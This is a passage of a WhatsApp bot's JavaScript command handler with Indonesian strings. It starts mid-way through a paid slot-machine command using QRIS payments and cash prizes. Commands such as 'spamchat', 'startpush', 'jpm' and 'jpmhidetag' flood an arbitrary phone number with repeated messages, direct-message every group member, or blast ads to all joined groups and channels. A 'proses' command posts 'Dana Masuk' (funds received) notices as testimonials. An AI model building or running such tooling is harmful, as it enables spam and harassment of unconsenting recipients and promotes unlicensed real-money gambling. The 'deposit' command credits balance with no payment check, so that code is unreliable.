 break; // Jika gagal, keluar dari animasi
 }
 }

 // Hasil akhir
 let finalResult, reward = 0;
 if (resultType === 'bigWin') {
 const symbol = spin();
 finalResult = [symbol, symbol, symbol];
 reward = harga * 2; // Hadiah besar
 } else if (resultType === 'smallWin') {
 const symbol = spin();
 finalResult = [symbol, symbol, spin()];
 reward = harga * 1.5; // Hadiah kecil
 } else {
 finalResult = [spin(), spin(), spin()];
 }

 // Tampilkan hasil akhir
 const finalDisplay = `| ${finalResult[0]} | ${finalResult[1]} | ${finalResult[2]} |`;
 const resultMessage = reward > 0
 ? `🎉 Selamat! Anda memenangkan *Rp. ${reward}*!\nSilahkan hubungi admin untuk klaim hadiah.`
 : `😢 Sayang sekali, Anda kalah! Coba lagi.\nSemoga beruntung di kesempatan berikutnya!`;

 await cupen.sendMessage(m.chat, {
 text: `🎰 *SLOT MACHINE* 🎰\n\n${finalDisplay}\n\n${resultMessage}`,
 edit: slotMessage.key,
 });

 if (reward > 0) {
 await cupen.sendMessage(m.chat, { text: `💵 Anda memenangkan hadiah Rp. ${reward}!` });
 }
 }
 } catch (error) {
 console.error('Error memeriksa status transaksi:', error);
 }

 if (!isTransactionComplete) {
 await new Promise(resolve => setTimeout(resolve, 10000));
 }
 }

 if (!isTransactionComplete) {
 const expiredText = `*⏰ WAKTU PEMBAYARAN HABIS!*\n\nTransaksi Anda telah melebihi batas waktu. Silakan coba lagi.`;
 await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
 }

 } catch (error) {
 console.error('Error membuat QRIS atau memeriksa status:', error);
 m.reply('Gagal membuat atau memeriksa pembayaran.');
 }
 break;
}

case 'hd': {
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await cupen.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./serverside/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
cupen.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break

case 'proses': {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');  
if (!q) return m.reply("jasa install panel")
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${global.link}

*Marketplace :*
${global.linkgrup}`
await cupen.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${global.namaowner}`, 
thumbnailUrl: global.urlfoto, 
sourceUrl: global.link,
}}}, {quoted: null})
}
break



case 'ping':
{
 let timestamp = speed();
 let latensi = speed() - timestamp;
 let tio = await nou.os.oos();
 var tot = await nou.drive.info();

 let teks = `🌐 *_${global.kiw}SERVER STATUS${global.kiw}_* 
📡 Platform : ${nou.os.type()} 
💾 Total RAM : ${formatp(os.totalmem())} 
📂 Total Disk : ${tot.totalGb} GB 
⚙️ Total CPU : ${os.cpus().length} Core 
⏱️ VPS Uptime : ${runtime(os.uptime())} 

🤖 *_${global.kiw}BOT STATUS${global.kiw}_*
⚡ Response Speed : ${latensi.toFixed(4)} detik 
⏳ Bot Uptime : ${runtime(process.uptime())} 
 `;

 await cupen.sendMessage(m.chat, { 
 text: teks, 
 mentions: [m.sender], 
 contextInfo: {
 externalAdReply: {
 title: `Ping Information ✅`, 
 body: `© Powered By ${global.namaowner}`, 
 thumbnailUrl: global.urlfoto, 
 sourceUrl: global.link,
 }
 } 
 }, { quoted: null });
}
break;



case 'spamchat': {
 if (!q) return m.reply(`❌ Format salah!\n\nContoh:\n.spamchat teksnya <jumlah spam>\n.spamchat 6289502445574 teksnya <jumlah spam>`);

 const args = q.split(' ');
 let target = m.chat; // Default ke chat aktif
 let message = '';
 let count = 1;

 // Jika argumen pertama adalah nomor telepon
 if (/^\d+$/.test(args[0])) {
 target = `${args[0]}@s.whatsapp.net`; // Format nomor ke JID
 args.shift(); // Hapus nomor dari argumen
 }

 // Ambil teks dan jumlah spam
 const textIndex = args.findIndex(arg => isNaN(arg)); // Index teks pertama
 if (textIndex === -1) return m.reply(`❌ Jumlah spam harus ditentukan di akhir.`);
 count = parseInt(args.pop()); // Jumlah spam
 message = args.join(' '); // Gabungkan teks

 if (count <= 0 || count > 100) return m.reply(`❌ Jumlah spam harus antara 1-100.`);

 // Konfirmasi spam
 m.reply(`📤 Mengirim ${count} pesan ke ${target.includes('@s.whatsapp.net') ? `nomor ${args[0]}` : `chat ini`}...\n\nTeks:\n${message}`);

 for (let i = 0; i < count; i++) {
 await cupen.sendMessage(target, { text: message });
 await sleep(1000); // Jeda 1 detik per pesan
 }

 m.reply(`✅ Spam selesai, ${count} pesan telah dikirim.`);
}
break;

case 'deposit': {
 const amount = parseInt(text); // Jumlah yang diinput user
 if (isNaN(amount) || amount <= 0) {
 return cupen.sendMessage(m.chat, { text: 'Masukkan jumlah deposit yang valid.' });
 }

 if (!global.db.users[m.sender]) {
 global.db.users[m.sender] = { saldo: 0, items: [] }; // Inisialisasi user jika belum ada
 }

 global.db.users[m.sender].saldo += amount;
 saveDB(); // Simpan perubahan ke database

 cupen.sendMessage(m.chat, { text: `✅ Saldo Anda telah bertambah sebesar ${amount} Coins.` });
}
break;

case 'cek': {
 if (!global.db.users[m.sender]) {
 global.db.users[m.sender] = { saldo: 0, items: [] }; // Inisialisasi user jika belum ada
 }

 const user = global.db.users[m.sender];
 const items = user.items.length > 0 ? user.items.join(', ') : 'Tidak ada item';

 const teks = `💳 *Saldo Anda:* ${user.saldo} Coins\n` +
 `🎒 *Item Anda:* ${items}`;
 cupen.sendMessage(m.chat, { text: teks });
}
break;

case 'infosaham': {
 let text = `📊 *Informasi Saham*\n\n`;
 for (let [key, value] of Object.entries(global.stockMarket)) {
 text += `💼 *${value.name} (${key})*\n` +
 `💵 Harga: ${formatNumber(value.price)}\n` +
 `📈 Perubahan: ${value.change >= 0 ? '+' : ''}${value.change}%\n` +
 `📝 Deskripsi: ${value.description}\n\n`;
 }
 cupen.sendMessage(m.chat, { text });
}
break;

case 'invest':
{
 const [stockSymbol, amount] = q.split('|').map(v => v.trim());
 const investmentAmount = parseInt(amount);

 if (!stockSymbol || isNaN(investmentAmount)) {
 return m.reply('❌ Format salah! Gunakan: .invest <kode saham>|<jumlah investasi>');
 }

 const stock = global.stockMarket[stockSymbol.toUpperCase()];
 if (!stock) {
 return m.reply(`❌ Saham ${stockSymbol} tidak ditemukan!`);
 }

 if (investmentAmount < stock.minInvestment) {
 return m.reply(`❌ Jumlah investasi minimal untuk saham ${stockSymbol} adalah Rp${stock.minInvestment}.`);
 }

 const user = global.db.users[m.sender];
 if (!user) {
 return m.reply('❌ Anda belum terdaftar!');
 }

 if (user.saldo < investmentAmount) {
 return m.reply('❌ Saldo Anda tidak mencukupi untuk investasi ini.');
 }

 // Deduct saldo and add investment
 user.saldo -= investmentAmount;
 user.portfolio = user.portfolio || {};
 user.portfolio[stockSymbol] = (user.portfolio[stockSymbol] || 0) + investmentAmount;

 return m.reply(`✅ Investasi berhasil!\n\nSaham: ${stockSymbol}\nJumlah: Rp${investmentAmount}\nSaldo tersisa: Rp${user.saldo}`);
}
break;


case 'jualsaham': {
 const [stock, amount] = q.split(' ');
 if (!stock || !amount || isNaN(amount)) {
 return cupen.sendMessage(m.chat, { text: `❌ Format salah! Gunakan: *!jualsaham [kode saham] [jumlah]*` });
 }

 const user = global.db.users[m.sender];
 const stockData = global.stockMarket[stock.toUpperCase()];
 if (!stockData) return cupen.sendMessage(m.chat, { text: `❌ Saham tidak ditemukan!` });

 const owned = user.portfolio[stock.toUpperCase()];
 if (!owned || owned < amount) return cupen.sendMessage(m.chat, { text: `❌ Anda tidak memiliki cukup saham ${stock.toUpperCase()} untuk dijual.` });

 const totalPrice = stockData.price * amount;
 user.saldo += totalPrice;
 user.portfolio[stock.toUpperCase()] -= parseInt(amount);

 cupen.sendMessage(m.chat, { text: `✅ Anda berhasil menjual ${amount} saham ${stockData.name} (${stock.toUpperCase()}) dan mendapatkan ${formatNumber(totalPrice)}.` });
 saveDB();
}
break;

case 'dompetsaham': {
 const user = global.db.users[m.sender];
 let text = `📂 *Dompet Saham Anda*\n\n`;
 for (let [key, value] of Object.entries(user.portfolio)) {
 const stockData = global.stockMarket[key];
 if (value > 0) {
 text += `💼 *${stockData.name} (${key})*\n` +
 `📊 Jumlah: ${value}\n` +
 `💵 Nilai Total: ${formatNumber(value * stockData.price)}\n\n`;
 }
 }
 cupen.sendMessage(m.chat, { text: text || '❌ Anda belum memiliki saham.' });
}
break;

case 'belilotre': {
 const user = global.db.users[m.sender];
 const ticketPrice = global.dailyLottery.ticketPrice;

 if (!user) return m.reply('❌ Akun tidak ditemukan!');
 if (user.saldo < ticketPrice) return m.reply('❌ Saldo Anda tidak mencukupi untuk membeli tiket!');

 user.saldo -= ticketPrice;
 global.dailyLottery.tickets.push({ user: m.sender, name: m.pushName });

 m.reply(`✅ Anda berhasil membeli tiket lotre harian seharga Rp${formatNumber(ticketPrice)}! Tunggu undian pada pukul ${global.dailyLottery.drawTime}.`);
}
break;

case 'drawlotre': {
 if (!isCreator) return m.reply('❌ Fitur ini hanya dapat dijalankan oleh Owner.');

 const tickets = global.dailyLottery.tickets;
 if (tickets.length === 0) return m.reply('❌ Tidak ada tiket yang terdaftar untuk undian hari ini.');

 const winnerIndex = Math.floor(Math.random() * tickets.length);
 const winner = tickets[winnerIndex];

 const prize = global.dailyLottery.prizes[Math.floor(Math.random() * global.dailyLottery.prizes.length)];
 let message = `🎉 *Pemenang Lotre Harian* 🎉\n\nNama: ${winner.name}\nNomor: ${winner.user}`;

 if (prize.type === 'saldo') {
 global.db.users[winner.user].saldo += prize.amount;
 message += `\nHadiah: Saldo Rp${formatNumber(prize.amount)}`;
 } else if (prize.type === 'item') {
 message += `\nHadiah: ${prize.name}`;
 } else if (prize.type === 'kosong') {
 message += `\nHadiah: ${prize.message}`;
 }

 global.dailyLottery.tickets = []; // Reset tiket setelah undian
 m.reply(message);
}
break;

case 'ceklotre': {
 const tickets = global.dailyLottery.tickets;
 if (tickets.length === 0) return m.reply('❌ Tidak ada tiket yang terdaftar untuk undian hari ini.');

 let ticketList = '*🎟️ Tiket Lotre Terdaftar 🎟️*\n\n';
 tickets.forEach((ticket, index) => {
 ticketList += `${index + 1}. ${ticket.name} (${ticket.user})\n`;
 });

 m.reply(ticketList);
}
break;

case 'duel':
{
 const user = global.db.users[m.sender];
 const [target, bet] = q.split('|').map(v => v.trim());
 const targetId = target.replace('@', '') + '@s.whatsapp.net';
 const betAmount = parseInt(bet);

 if (!target || isNaN(betAmount)) return m.reply('❌ Format salah! Gunakan: .duel @target|jumlah taruhan');
 if (!user) return m.reply('❌ Akun Anda tidak ditemukan!');
 if (user.saldo < betAmount) return m.reply('❌ Saldo Anda tidak mencukupi untuk taruhan ini!');

 const targetUser = global.db.users[targetId];
 if (!targetUser) return m.reply('❌ Pengguna yang ditantang tidak ditemukan!');
 if (targetUser.saldo < betAmount) return m.reply('❌ Pengguna yang ditantang tidak memiliki saldo yang cukup!');

 global.duels.push({
 challenger: m.sender,
 challengerName: m.pushName || 'Pengguna', // Simpan nama penantang
 target: targetId,
 targetName: targetUser.name || 'Pengguna', // Simpan nama target
 bet: betAmount
 });

 m.reply(`🎮 *Tantangan Duel*\n\n${m.pushName} menantang ${target} untuk duel dengan taruhan Rp${formatNumber(betAmount)}!\n\nBalas dengan *.accept* untuk menerima tantangan.`);
}
break;





case 'accept':
{
 const duel = global.duels.find(d => d.target === m.sender);
 if (!duel) return m.reply('❌ Tidak ada tantangan duel yang ditujukan untuk Anda.');

 const { challenger, challengerName, target, targetName, bet } = duel;

 const challengerUser = global.db.users[challenger];
 const targetUser = global.db.users[target];

 if (!challengerUser || !targetUser) return m.reply('❌ Akun tidak ditemukan!');
 if (challengerUser.saldo < bet || targetUser.saldo < bet) {
 return m.reply('❌ Salah satu peserta tidak memiliki saldo yang cukup untuk melanjutkan duel.');
 }

 // Kurangi saldo taruhan
 challengerUser.saldo -= bet;
 targetUser.saldo -= bet;

 // Tentukan pemenang secara acak
 const winner = Math.random() > 0.5 ? challenger : target;
 const winnerName = winner === challenger ? challengerName : targetName;
 const prize = bet * 2;

 // Tambahkan saldo ke pemenang
 global.db.users[winner].saldo += prize;

 global.duels = global.duels.filter(d => d.target !== m.sender); // Hapus duel dari daftar

 m.reply(`🎉 *Hasil Duel*\n\nPemenang: ${winnerName}\nHadiah: Rp${formatNumber(prize)}\n\nTerima kasih telah bermain!`);
}
break;


case 'decline':
{
 const duel = global.duels.find(d => d.target === m.sender);
 if (!duel) return m.reply('❌ Tidak ada tantangan duel yang ditujukan untuk Anda.');

 global.duels = global.duels.filter(d => d.target !== m.sender); // Hapus duel dari daftar
 m.reply('❌ Anda telah menolak tantangan duel.');
}
break;


case 'transfersaldo': {
 const [target, amount] = q.split('|').map(v => v.trim());
 const targetId = target.replace('@', '') + '@s.whatsapp.net';
 const transferAmount = parseInt(amount);

 if (!target || isNaN(transferAmount)) return m.reply('❌ Format salah! Gunakan: .transfersaldo @target|jumlah');
 if (transferAmount <= 0) return m.reply('❌ Jumlah transfer harus lebih dari 0.');

 const sender = global.db.users[m.sender];
 const recipient = global.db.users[targetId];

 if (!sender) return m.reply('❌ Akun Anda tidak ditemukan!');
 if (!recipient) return m.reply('❌ Akun penerima tidak ditemukan!');
 if (sender.saldo < transferAmount) return m.reply('❌ Saldo Anda tidak mencukupi untuk transfer ini!');

 // Proses transfer
 sender.saldo -= transferAmount;
 recipient.saldo += transferAmount;

 m.reply(`✅ *Transfer Berhasil*\n\nAnda telah mentransfer Rp${formatNumber(transferAmount)} ke ${target}.\n\n*Sisa Saldo Anda:* Rp${formatNumber(sender.saldo)}.`);
}
break;

    case 'listidgb': {
 try {
 const allGroups = await cupen.groupFetchAllParticipating();
 const groupList = Object.values(allGroups).map(group => ({
 id: group.id,
 subject: group.subject
 }));

 if (groupList.length === 0) {
 return m.reply('❌ Bot tidak ada di grup manapun.');
 }

 let message = `📋 *Daftar ID Grup*:\n\n`;
 groupList.forEach((group, index) => {
 message += `${index + 1}. *${group.subject}*\nID: ${group.id}\n\n`;
 });

 m.reply(message);
 } catch (err) {
 console.error(err);
 m.reply('❌ Terjadi kesalahan saat mengambil daftar grup.');
 }
}
break;

case 'cratepush': {
 try {
 if (!q) return m.reply('❌ Format salah! Gunakan: .cratepush idgroup|jeda|text');
 const [idGroup, delay, text] = q.split('|').map(v => v.trim());

 if (!idGroup || !delay || !text) {
 return m.reply('❌ Format salah! Gunakan: .cratepush idgroup|jeda|text');
 }

 if (isNaN(delay) || parseInt(delay) <= 0) {
 return m.reply('❌ Jeda harus berupa angka dan lebih dari 0.');
 }

 global.db.pushContacts[idGroup] = {
 delay: parseInt(delay) * 1000, // Konversi detik ke milidetik
 text,
 active: false
 };

 m.reply(`✅ Push kontak berhasil dibuat untuk grup ${idGroup}.\nJeda: ${delay} detik.\nTeks: ${text}`);
 } catch (err) {
 console.error(err);
 m.reply('❌ Terjadi kesalahan saat membuat push kontak.');
 }
}
break;

case 'startpush': {
 try {
 const idGroup = q.trim();
 if (!idGroup || !global.db.pushContacts[idGroup]) {
 return m.reply('❌ ID grup tidak ditemukan atau belum dibuat.');
 }

 const pushData = global.db.pushContacts[idGroup];
 if (pushData.active) return m.reply('❌ Push kontak untuk grup ini sudah aktif.');

 const groupMetadata = await cupen.groupMetadata(idGroup);
 const participants = groupMetadata.participants.map(p => p.id);

 if (!participants.length) return m.reply('❌ Tidak ada anggota dalam grup.');

 pushData.active = true;

 (async function pushLoop() {
 for (const participant of participants) {
 if (!pushData.active) break; // Berhenti jika dihentikan
 await cupen.sendMessage(participant, { text: pushData.text });
 await new Promise(resolve => setTimeout(resolve, pushData.delay)); // Tunggu sebelum lanjut
 }
 pushData.active = false; // Selesai
 })();

 m.reply(`✅ Push kontak untuk grup ${idGroup} telah dimulai.`);
 } catch (err) {
 console.error(err);
 m.reply('❌ Terjadi kesalahan saat memulai push kontak.');
 }
}
break;

case 'stoppush': {
    try {
        const idGroup = q.trim(); // Mengambil ID grup dari input
        if (!idGroup || !global.db.pushContacts[idGroup]) {
            return m.reply('❌ ID grup tidak ditemukan atau belum dibuat.');
        }

        if (!global.db.pushContacts[idGroup].active) {
            return m.reply('❌ Push kontak untuk grup ini sudah tidak aktif.');
        }

        // Menonaktifkan push kontak
        global.db.pushContacts[idGroup].active = false;
        m.reply(`✅ Push kontak untuk grup ${idGroup} telah dihentikan.`);
    } catch (err) {
        console.error(err); // Debugging error jika terjadi masalah
        m.reply('❌ Terjadi kesalahan saat mencoba menghentikan push kontak.');
    }
}
break;

case 'listpush':
{
 try {
 const pushContacts = global.db.pushContacts || {};
 const keys = Object.keys(pushContacts);

 if (keys.length === 0) {
 return m.reply('❌ Belum ada grup yang dibuat untuk push kontak.');
 }

 let response = '📋 *Daftar Grup Push Kontak:*\n\n';
 keys.forEach((id, index) => {
 const groupData = pushContacts[id];
 const status = groupData.active ? '🟢 Aktif' : '🔴 Tidak Aktif';
 const interval = groupData.interval ? groupData.interval / 1000 : 'Tidak Ditetapkan';
 const message = groupData.message || 'Tidak Ada Pesan';

 response += `${index + 1}. ID Grup: ${id}\n Status: ${status}\n Jeda: ${interval}s\n Pesan: ${message}\n\n`;
 });

 m.reply(response.trim());
 } catch (err) {
 console.error(err);
 m.reply('❌ Terjadi kesalahan saat mencoba menampilkan daftar grup push kontak.');
 }
}
break;


case 'jpm':{
if (!isCreator) return m.reply('Khusus Own');
if (!q) return m.reply("Teks Nya Mana Mas Cupen?")
let allgrup = await cupen.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Proses Mas ❀SalwaCantik❀ *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await cupen.sendMessage(i, {text: `${teks}`}, {quoted: fkontak})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await cupen.sendMessage(jid, {text: `*Done Tuanku 🥶*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: fkontak})
}
break

case 'idch': {
if (!text) return m.reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await cupen.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break



case 'promote': {
if (!m.isGroup) return m.reply('khusus group')
if (!isCreator && !isAdmins) return m.reply ('khusus admin')
if (!isBotAdmins) return m.reply('bot bukan admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await cupen.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'demote':
{
if (!m.isGroup) return m.reply('khusus group')
if (!isCreator && !isAdmins) return m.reply('Khusus Admin')
if (!isBotAdmins) return m.reply('Bot Bukan Admin');
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await cupen.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break
case 'closetime': {
if (!isAdmins) return m.reply('Khusus Admin');
if (!isCreator) return m.reply('Khusus Owner');
if (!isBotAdmins) return m.reply('Bot Bukan Admin');
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Close time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan ditutup!`, 10000);
setTimeout(() => {
const close = `*[ CLOSE TIME ]* Grup telah ditutup!`;
cupen.groupSettingUpdate(from, 'announcement');
m.reply(close);
}, timer);
}
break;

case 'opentime': {
if (!isAdmins) return m.reply('Ror');
if (!isCreator) return m.reply('Khusus Owner');
if (!isBotAdmins) return m.reply('Bot Bukan Admin');
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Open time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan dibuka!`, 10000);
setTimeout(() => {
const open = `*[ OPEN TIME ]* Grup telah dibuka!`;
cupen.groupSettingUpdate(from, 'not_announcement');
m.reply(open);
}, timer);
}
break;

case 'jpmslide': case 'startjpmslide': {
if (!isCreator) return m.reply('Khusus Own')
let total = 0
let getGroups = await cupen.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayJpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg") }, { upload: cupen.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*❀SalwaCantik❀* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `❀SalwaCantik❀`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{ 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6289502445574\",\"merchant_url\":\"https://aanapi.my.id\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `❀SalwaCantik❀`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{ 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6289502445574\",\"merchant_url\":\"https://aanapi.my.id\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `❀SalwaCantik❀`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{ 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6289502445574\",\"merchant_url\":\"https://aanapi.my.id\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await m.reply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await cupen.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayJpm)
}
await m.reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break

case 'jpmch':
{
 if (!isCreator) return m.reply('Khusus Own');
 if (!text) return m.reply("Teks Nya Mana Mas ❀SalwaCantik❀?"); // Periksa apakah teks tersedia
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
 "120363326439706177@newsletter",
 "120363293691624662@newsletter",
 "120363351572746964@newsletter",
 "120363312383238112@newsletter",
 "120363318521671268@newsletter",
 "120363339655411756@newsletter",
 "120363318195685462@newsletter",
 "120363317590567007@newsletter",
 "120363323927211654@newsletter",
 "120363349663089430@newsletter",
 "120363323927211654@newsletter",
 "120363305121469207@newsletter",
 "120363330289360382@newsletter",
 "120363377528029023@newsletter",
 "120363374437613386@newsletter",
 "120363325357770847@newsletter",
 "120363376340672180@newsletter",
 "120363382967054861@newsletter" // Tambahkan ID saluran lainnya
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await cupen.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Yah Gagal Mas mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 m.reply("Done Tuanku 🥶 mengirim pesan *teks* ke semua channel WhatsApp");
}
break;


;

case 'jpmhidetag': {
 if (!isCreator) return m.reply('Khusus Own');
 if (!q) return m.reply("Teks Nya Mana Mas ❀SalwaCantik❀?");

 let allgrup = await cupen.groupFetchAllParticipating();
 let res = await Object.keys(allgrup);
 let count = 0;
 const jid = m.chat;
 const teks = text;

 // Pesan awal
 await m.reply(`Proses Tuanku 🥶 *jpm* teks ke ${res.length} grup`);

 for (let i of res) {
 if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;

 try {
 // Ambil semua anggota grup
 let metadata = await cupen.groupMetadata(i);
 let participants = metadata.participants.map((p) => p.id);

 // Kirim pesan dengan mention tanpa simbol @
 await cupen.sendMessage(i, {
 text: teks,
 mentions: participants, // Mention semua anggota grup
 }, { quoted: fkontak });

 count += 1;
 } catch (err) {
 console.error(`Gagal mengirim ke grup ${i}:`, err);
 }

 // Delay antar pengiriman
 await sleep(global.delayJpm || 1000);
 }

 // Kirim laporan akhir
 await cupen.sendMessage(jid, {
 text: `*Done Tuanku 🥶*\nTotal grup yang berhasil dikirim pesan: ${count}`,
 }, { quoted: fkontak });
}
break;

case 'blacklistjpm': {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');
 const groupId = m.chat; // ID grup saat perintah diketik

 // Cek apakah chat ini adalah grup
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup.');

 // Ambil data grup dari database
 if (!global.db.groups) global.db.groups = {};
 if (!global.db.groups[groupId]) global.db.groups[groupId] = {};

 // Toggle blacklist
 if (global.db.groups[groupId].blacklistjpm) {
 delete global.db.groups[groupId].blacklistjpm;
 m.reply('Grup ini telah dihapus dari daftar blacklist JPM.');
 } else {
 global.db.groups[groupId].blacklistjpm = true;
 m.reply('Grup ini telah ditambahkan ke daftar blacklist JPM.');
 }
}
break;

case 'listdaftarbl': {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');

 // Cek apakah database grup sudah ada
 if (!global.db.groups) global.db.groups = {};

 // Ambil semua grup yang di-blacklist
 let blacklistGroups = Object.entries(global.db.groups)
 .filter(([id, data]) => data.blacklistjpm === true);

 // Jika tidak ada grup yang di-blacklist
 if (blacklistGroups.length === 0) {
 return m.reply('Tidak ada grup yang di-blacklist.');
 }

 // Buat daftar grup yang di-blacklist
 let list = '*Daftar Grup Blacklist JPM:*\n\n';
 for (let [id, data] of blacklistGroups) {
 let groupMetadata = await cupen.groupMetadata(id).catch(() => null); // Ambil info grup
 let groupName = groupMetadata ? groupMetadata.subject : 'Grup tidak ditemukan';
 list += `• *Nama Grup:* ${groupName}\n *ID Grup:* ${id}\n\n`;
 }

 // Kirim daftar
 m.reply(list.trim());
}
break;

case 'delbljpm': {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');

 // Ambil ID grup dari argumen
 let groupId = args[0]; // Format: !delbljpm <group_id>
 if (!groupId) return m.reply('Silakan masukkan ID grup. Contoh: !delbljpm 1234567890-123456@g.us');
 if (!groupId.endsWith('@g.us')) return m.reply('ID grup tidak valid.');

 // Cek apakah grup ada di database blacklist
 if (!global.db.groups[groupId] || !global.db.groups[groupId].blacklistjpm) {
 return m.reply(`Grup ${groupId} tidak ada dalam daftar blacklist JPM.`);
 }

 // Hapus dari blacklist
 delete global.db.groups[groupId].blacklistjpm;
 m.reply(`Grup ${groupId} telah dihapus dari daftar blacklist JPM.`);
}
break;

case 'sisadroplet': {
if (!isCreator) return m.reply('Khusus Own')
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.digitalocean_apikey}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.digitalocean_apikey}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return m.reply('Khusus Own')

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

